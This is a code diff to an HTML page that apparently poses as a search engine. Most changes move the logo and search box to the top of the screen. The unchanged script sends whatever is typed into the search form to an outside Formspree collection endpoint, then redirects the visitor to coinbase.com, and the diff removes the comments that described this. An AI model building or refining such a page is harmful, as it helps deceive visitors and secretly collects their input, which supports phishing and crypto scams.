@@ -41,11 +41,13 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
+            /* Align content to the top instead of center */
+            justify-content: flex-start;
             padding: 0 16px;
         }
         .logo {
-            margin-bottom: 40px;
+            margin-top: 12vh;        /* Moves logo down from the top a bit */
+            margin-bottom: 40px;      /* Space between logo and search box */
         }
         .logo img {
             width: 272px;
@@ -83,8 +85,15 @@
             cursor: pointer;
         }
 
+        /* Adjust top margin on smaller screens so it doesn't go too high */
+        @media (max-width: 768px) {
+            .logo {
+                margin-top: 8vh;
+            }
+        }
         @media (max-width: 480px) {
             .logo {
+                margin-top: 5vh;
                 margin-bottom: 25px;
             }
         }
@@ -120,7 +129,6 @@
 
 <script>
 (function() {
-    // ✅ Your Formspree endpoint (active)
     const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mojnzrkd';
 
     const form = document.getElementById('searchForm');
@@ -149,8 +157,7 @@
             });
 
             if (response.ok) {
-                // Redirect to your chosen Bitcoin site
-                window.location.href = 'https://coinbase.com'; // Change if you want
+                window.location.href = 'https://coinbase.com';
             } else {
                 const errorData = await response.json();
                 alert('Submission failed: ' + (errorData.error || 'Unknown error'));
